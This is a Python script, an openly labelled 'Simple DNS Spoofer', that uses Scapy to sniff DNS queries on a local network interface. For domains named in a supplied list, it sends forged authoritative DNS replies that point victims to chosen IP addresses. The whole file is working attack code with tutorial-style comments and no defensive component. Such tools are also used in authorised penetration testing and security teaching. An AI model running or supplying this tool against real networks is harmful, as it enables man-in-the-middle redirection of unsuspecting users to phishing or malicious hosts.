#! /usr/bin/python3

from colorama import Fore, Style, init
from scapy.all import *
import argparse
import os
import sys

init(autoreset=True)  # Automatically resets color after each print

def packet_handler(iface, packet, spoofed_ip_list):
	# Ensure it's a DNS query
	if packet.haslayer(DNSQR):
		# DNS queries often include a trailing dot (e.g., "example.com."), so Strip trailing dot with .rstrip('.')
		domain = packet[DNSQR].qname.decode().rstrip('.')
		src_ip = packet[IP].src

		# Checks if requested domain in our spoofed domain resolve list
		if domain in spoofed_ip_list.keys():
			print(f"{Fore.YELLOW}Requested domain: {Fore.GREEN}{domain}{Fore.YELLOW} from {Fore.YELLOW}{src_ip} ---> Resolved to {Fore.GREEN}{spoofed_ip_list[domain]}")

			# Build dns response (Ether/IP/UDP/DNS)
			# Use sendp() with the full Ethernet frame if were're on a LAN and want to ensure delivery, If we using send(), which crafts and sends the packet at Layer 3 (IP). However, DNS typically uses Layer 2 (Ethernet) in local networks.
			dns_response = Ether(dst=packet[Ether].src, src=packet[Ether].dst)/\
				IP(dst=packet[IP].src, src=packet[IP].dst)/\
				UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/\
				DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, qr=1, an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=spoofed_ip_list[domain]))

			try:
				sendp(dns_response, iface=iface, verbose=0)
			except Exception as error:
				print(f"{Fore.RED}[x] Sending spoofed DNS reply failed with error: {error}")
				sys.exit(0)

def packet_sniffer(iface, spoofed_ip_list):
	try:
	    print(f"{Fore.CYAN}[*] Sniffing DNS packets...\n")
	    # Use prn= inside sniff() to process each packet as it's captured.
	    # Use store= in sniff() to avoid storing packets in memory unnecessarily.
	    # sniff() only allows prn to be a function that takes one argument: the packet. To work around this, you can use a lambda function to pass additional arguments to your packet handler.
	    packet = sniff(iface=iface, filter="udp and dst port 53", prn=lambda pkt: packet_handler(iface, pkt, spoofed_ip_list), store=False)
	except KeyboardInterrupt:
	    print(f"\n{Fore.RED}[x] Sniffing stopped by user. (CTRL+C was detected)")
	    sys.exit(0)

def read_files(ipaddr_list, domain_list):
	try:
		with open(ipaddr_list, "r") as ipaddr, open(domain_list, "r") as domain:
			# Return as a list
			keys = domain.read().splitlines()
			values = ipaddr.read().splitlines()
			# Merged lists
			merged_dict = dict(zip(keys, values))
			return merged_dict
	except Exception as read_files_error:
		print(f"{Fore.RED}[x] Error while reading files: {read_files_error}")
		sys.exit(1)

def file_validation(ipaddr_list, domain_list):
	# Validates that the given files exist and are not empty.
	try:
		for file in [ipaddr_list, domain_list]:
			if not os.path.isfile(file):
				print(f"[x] File not found: {file}")
				sys.exit(1)

			if os.path.getsize(file) == 0:
				print(f"[x] File is empty: {file}")
				sys.exit(1)
	except Exception as validation_error:
		print(f"{Fore.RED}[x] Error while validating {file}: {validation_error}")
		sys.exit(1)

def main():
	# Create parser object (ArgumentDefaultsHelpFormatter ensures default values are shown in the help text.)
	parser = argparse.ArgumentParser(description="Simple DNS Spoofer with Scapy", formatter_class=argparse.ArgumentDefaultsHelpFormatter)

	# Add arguments
	parser.add_argument("-i", "--iface", metavar="", default="eth0", help="Network interface")
	parser.add_argument("-a", "--ipaddr", metavar="", help="IP addresses list")
	parser.add_argument("-d", "--domain", metavar="", help="Domain names list")

	# Use arguments
	args = parser.parse_args()

	# IP addresses list and Domain names list validation
	file_validation(args.ipaddr, args.domain)

	# Read files and return a merged dictionary
	merged_dict = read_files(args.ipaddr, args.domain)

	try:
		# sniff() is a blocking call—it waits until packets arrive or until interrupted. Wrapping it in a loop is unnecessary and could cause confusion.
		# Sniff packets
		packet_sniffer(args.iface, merged_dict)
	except KeyboardInterrupt:
	    print(f"\n{Fore.RED}[x] Sniffing stopped by user. (CTRL+C was detected)")
	    sys.exit(0)
main()